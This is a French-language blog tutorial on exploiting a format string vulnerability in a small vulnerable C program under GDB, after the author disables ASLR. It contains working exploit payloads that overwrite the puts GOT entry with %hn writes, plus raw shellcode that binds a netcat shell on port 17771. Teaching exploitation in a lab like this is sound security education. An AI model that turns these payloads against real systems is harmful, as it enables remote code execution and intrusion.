---
layout: post
title:  "Format String avec GDB"
date:   2017-02-28
category: Binary
excerpt_separator: <!--more-->
lang: fr
---
Bonjour à tous,  
  
Aujourd'hui un petit article qui traitera d'un cas simple de Format String où nous exploiterons un buffer passé en argument. L'idée de cet article fait suite à la machine [Pegasus 1](https://www.vulnhub.com/entry/pegasus-1,109/) de vulnhub que je vous recommande chaudement.  
  
J'essaierai d'être assez pédagogue, le cas ci-dessous étant un cas basique sans contournement des protections de la pile.  
<!--more-->
  
**Qu'entend-on par Format String?**  
    
*"The format string is written in a simple template language, and specifies a method for rendering an arbitrary number of varied data type parameters into a string."*  
  
```
%c char single character
%d (%i) int signed integer
%e (%E) float or double exponential format
%f float or double signed decimal
%g (%G) float or double use %f or %e as required
%o int unsigned octal value
%p pointer address stored in pointer
%s array of char sequence of characters
%u int unsigned decimal
%x (%X) int unsigned hex value
%n Print nothing, but writes the number of characters successfully written so far into an integer pointer parameter.
```  

Voici le code que nous allons utiliser:
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char const *argv[])
{

	char argument[101];

	printf("Your input:\n");
	fgets(argument, sizeof argument, stdin);

	printf(argument);		
	printf("Au revoir");

	return 0;
}
```  
  
L'exécution est simple:  
![fmt1]({{ site.url }}/public/images/fmt/fmt1.png)  
Fuzzons juste pour vérifier que le fgets fait bien son boulot et que nous évitons un débordement classique:  
![fmt2]({{ site.url }}/public/images/fmt/fmt2.png)  
Maintenant faisons un autre test:
```bash
#python -c 'print "%x"*100' | ./simple
Your input: 65b7fb05a0b7fffc08bffff27f025c10000257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578782578b7fb03dcbffff2f00b7e152761b7fb00000b7e152761bffff384bffff38c000b7fb0000b7fffc04b7fff00001Au revoir
```
  
Wowowo ça y est je suis l'élu, je sais lire la matrice?!  
  
Ce qui se passe ici est du au ```printf(argument);```. Ceci est valable avec toutes les fonctions similaires printf, fprintf, sprintf, snprintf, vprintf, vfprintf, vsprintf, vsnprintf.  
  
La version secure aurait été ```printf("%s",argument);``` pour forcer l'interprétation des données en tant que chaine de caractères:
```bash
Your input: 
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Au revoir
```  
  
Avec ```printf(argument);```, vous pouvez injecter des formateurs qui demanderont à la fonction printf de dépiler de la stack autant d'arguments que de formateurs. Ceci nous permettra de lire la mémoire de notre exécutable et nous le verrons d'écraser des adresses pour rediriger vers notre flot d'exécution.  
  
Avez-vous remarqué la suite **25782578257825782578** affichée avec le formateur **%x** ?:
```bash
echo -n 2578 | xxd -p -r
%x
```
  
Nous pouvons lire depuis la mémoire notre argument passé à notre exécutable.
```bash
python -c 'print "A"*20 + "-%x"*20' | ./simple
Your input: 
AAAAAAAAAAAAAAAAAAAA-65-b7fb05a0-b7fffc08-bffff27f-0-41c10000-41414141-41414141-41414141-41414141-2d414141-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d
Au revoir
```  
```bash
python -c 'print "A"*23 + "-%6$x"' | ./simple
Your input: 
AAAAAAAAAAAAAAAAAAAA-41c10000
Au revoir
```  

Here we go, nous trouvons le premier élement de notre buffer, le caractère 'A' (**%6$x** nous affiche la 6ème adresse). **41**c10000 reflète en réalité ce qui est stocké en mémoire de la façon suivante: 0000c141. En cause l'architecture petit-boutiste des processeurs x86.  
En effet le formateur %x lira le bloque de 32 bits comme une adresse, affichant en premier les octets de poids fort (donc stockés le plus à droite).  
  
Nous continuerons sous GDB et nous supprimons avant toute protection de la pile:
```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```
  
cf [Wikipédia](https://fr.wikipedia.org/wiki/Address_space_layout_randomization): 
*L’Address Space Layout Randomization (ASLR) ou distribution aléatoire de l'espace d'adressage est une technique permettant de placer de façon aléatoire les zones de données dans la mémoire virtuelle. Il s'agit en général de la position du tas, de la pile, des bibliothèques. Ce procédé permet de limiter les effets des attaques de type dépassement de tampon.*  
  
Positionnons un breakpoint juste avant notre appel printf:  
![fmt3]({{ site.url }}/public/images/fmt/fmt3.png)  

Maintenant injectons à nouveau le buffer de 100 caractères et examinons la mémoire juste après l'exécution de notre printf. Pour rappel une cheatsheet sympa en matière de BOs et de fonctionnement de la pile se trouve ici: [https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png](https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png).  
![fmt4]({{ site.url }}/public/images/fmt/fmt4.png)  
Il est logique de voir apparaitre notre buffer dans des adresses plus hautes sur la stack, les segments de cette dernière étant alloués sur des adresses décroissantes (les plus hautes vers les plus basses) et **printf** étant appelée après l'initialisation de notre buffer.  
  
Nous pouvons en déduire l'adresse de début de notre buffer. Cependant pour avoir des adresses continues, nous prendrons un byte plus loin: **0xbffff24c**.  
![fmt5]({{ site.url }}/public/images/fmt/fmt5.png)  
Maintenant revenons sur le formateur **%n**:  
*%n Print nothing, but writes the number of characters successfully written so far into an integer pointer parameter.*
  
Ce formateur écrira à l'adresse mémoire qu'on lui stipulera, qui ici sera lue depuis notre buffer. 
  
Maintenant il nous faut trouver l'adresse d'une fonction sur laquelle notre exécutable fera un call. Cela nous permettra de rediriger le flux d'exécution sur notre propre shellcode.    
Nous prendrons la fonction puts. Pourquoi ? car cette dernière est appelée juste après la fonction printf.
  
**[objdump](https://linux.die.net/man/1/objdump)** est une command qui nous fournit diverses informations sur les fichiers objet.  
*-R : Print the dynamic relocation entries of the file.*  
![fmt6]({{ site.url }}/public/images/fmt/fmt6.png)  
L'adresse peut également être trouvée de cette façon:  
![fmt7]({{ site.url }}/public/images/fmt/fmt7.png)  
From [Wikipedia](https://en.wikipedia.org/wiki/Relocation_%28computing%29): *The relocation table is a list of pointers created by the compiler or assembler and stored in the object or executable file. Each entry in the table, or "fixup", is a pointer to an absolute address in the object code that must be changed when the loader relocates the program so that it will refer to the correct location.*
  
```jmp *0x804a014``` nous montre que l'on va faire un jump à l'adresse contenue à l'adresse *0x804a014*.   
![fmt8]({{ site.url }}/public/images/fmt/fmt8.png)  
Let's check in gdb:  
![fmt9]({{ site.url }}/public/images/fmt/fmt9.png)  
  
Il semblerait que nous puissions écrire sur ce segment mémoire. Comment allons-nous procéder?  
D'abord injectons l'adresse mémoire à laquelle nous souhaitons écrire:  
![fmt10]({{ site.url }}/public/images/fmt/fmt10.png)  
On définit maintenant un point d'arrêt cette fois juste avant l'appel à la fonction printf:  
![fmt11]({{ site.url }}/public/images/fmt/fmt11.png)  
Bingo. On voit bien que l'adresse a été écrasée et que nous avons une **segmentation fault**.  
  
Maintenant la partie sensible, l'écriture de cette adresse. Pour écrire cette adresse nous utiliserons le formateur **%7$hn** dans notre cas. L'instruction de formatage **%hn** n'écrit que sur **16 octets**.  
  
Globalement notre buffer ressemblera à ceci:
```
"A"+"@ où écrire 16bits" + "@ où écrire les 16 autres bits" + "valeur correspondante à ces 16 bits" + "formateur écriture 16 bits" + "valeur correspondante à ces 16 autres bits" + "formateur écriture 16 bits" + "shellcode"
```  
  
Pourquoi ne pas écrire directement les 32 bits? Nous utiliserons la précision sur le formatage d'une valeur, ici le nombre de caractères sur lequel nous l'afficherons. L'adresse convertie en entier fournit un entier tout simplement trop grand pour être utilisé.   
```
(gdb) print 0xbffff24c 
$2 = 3221221964
```  
 
Tapez ```printf "%3221221964u"``` dans votre console. 
  
L'adresse finale écrite sera l'adresse de notre "shellcode".
  
Première étape:
```
(gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%7$hn" + "A" + "%8$hn" + "A"*50') 
...
Program received signal SIGSEGV, 
Segmentation fault. 0x000a0009 in ?? () 
```
  
Maintenant déterminons l'adresse précise de notre shellcode:  
![fmt12]({{ site.url }}/public/images/fmt/fmt12.png)  
**0xbffff26c** semble être un bon candidat. On ajoutera quelques NOPs également comme marge de manoeuvre, l'objectif étant de tomber dans nos NOPs et de slider jusqu'à notre shellcode.  
  
Ok maintenant les calculs:  
@ de puts: **0x804a014**  
@ du shellcode: **0xbffff26c**  
  
Calcul de la première partie de l'adresse (conversion décimale):
```
(gdb) print 0xbfff - 9 
$3 = 49142
```
```bash
printf "%x\n" 49142
0xbff6
```

Calcul de la seconde partie de l'adresse :
```
(gdb) print 0xf26c - 0xbff6 - 9
$18 = 12909
```

Ensuite on teste:
```
(gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%49142x" + "%8$hn" + "%12909x" + "%7$hn" + "\x90"*4 + "A"*100')
```
  
![fmt13]({{ site.url }}/public/images/fmt/fmt13.png)  
un rapide calcul nous montre qu'il nous reste **63 bytes** pour notre shellcode. 
  
Allons faire notre marché sur [shell-storm](http://shell-storm.org/shellcode/).  
Celui la est fun: [http://shell-storm.org/shellcode/files/shellcode-872.php](http://shell-storm.org/shellcode/files/shellcode-872.php).  
Il s'agit d'un shellcode qui appelle netcat (/bin/nc) et bind le port 17771 pour le rediriger sur /bin/sh.  
  
Nous adaptons donc notre payload et le testons sous gdb:  
```
(gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%49142x" + "%8$hn" + "%12909x" + "%7$hn" + "\x90"*4 + "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"')
```
![fmt14]({{ site.url }}/public/images/fmt/fmt14.png)  
Here we go, essayons de nous connecter:  
![fmt15]({{ site.url }}/public/images/fmt/fmt15.png)  
Du coté de notre shellcode:  
![fmt16]({{ site.url }}/public/images/fmt/fmt16.png)  
Nous pouvons donc en conclure qu'à partir d'un simple appel *printf*, il a été possible d'exécuter un bind shell. Bien évidemment ceci est un cas d'école et a été possible grâce à la désactivation de l'ASLR, rendant ainsi nos adresses prédictibles.

Pour conclure, si vous rencontrez un souci entre l'exécution dans l'environnement gdb et votre shell, voici une réponse: [https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it). Assurez-vous que les environnements soient strictement identiques. Ce [script](https://github.com/hellman/fixenv) peut également vous aider à avoir le même environnement avec/sans debugging.  
  
N'hésitez pas à me contacter ou à laisser un com.  
See Ya!  
  

Références:
 - [https://www.owasp.org/index.php/Format_string_attack](https://www.owasp.org/index.php/Format_string_attack)
